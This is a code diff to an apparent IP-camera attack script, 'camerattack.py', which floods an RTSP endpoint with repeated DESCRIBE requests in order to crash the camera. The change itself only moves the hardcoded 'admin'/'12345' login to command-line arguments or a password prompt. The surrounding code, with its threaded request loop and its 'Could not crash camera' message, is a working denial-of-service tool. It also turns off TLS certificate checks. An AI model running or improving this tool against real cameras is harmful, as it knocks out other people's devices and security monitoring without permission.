@@ -1,5 +1,6 @@
 import os
 import sys
+import getpass  # For securely inputting the password
 import requests
 from requests.auth import HTTPBasicAuth
 from colorama import Fore, Style
@@ -15,12 +16,12 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 def do_not_write(b, _):
     return len(b)
 
-def rtsp_describe(target, count):
+def rtsp_describe(target, count, username, password):
     try:
         response = requests.request(
             'DESCRIBE',
             target,
-            auth=HTTPBasicAuth('admin', '12345'),  # Replace with your credentials
+            auth=HTTPBasicAuth(username, password),
             headers={'Accept': 'application/sdp'},
             stream=True,
             verify=False  # Disable SSL verification (use cautiously)
@@ -41,10 +42,12 @@ def main():
 
     args = sys.argv[1:]
     if len(args) == 0:
-        print("usage: camerattack [RTSP URL]\n\texample: `python camerattack.py rtsp://admin:12345@192.168.1.1:554/live.sdp`\n")
+        print("usage: camerattack [RTSP URL] [username] [password]\n\texample: `python camerattack.py rtsp://192.168.1.1:554/live.sdp admin password`\n")
         sys.exit(1)
 
     target = args[0]
+    username = args[1] if len(args) > 1 else input("Enter username: ")
+    password = args[2] if len(args) > 2 else getpass.getpass("Enter password: ")
 
     spinner = Halo(text='Starting up...', spinner='dots')
     spinner.start()
@@ -54,7 +57,7 @@ def main():
         spinner.start()
 
         for thread in range(count, count+threads):
-            rtsp_describe(target, thread)
+            rtsp_describe(target, thread, username, password)
 
     spinner.stop()
     print(f"{red}✖ Could not crash camera after 100000 attempts.")
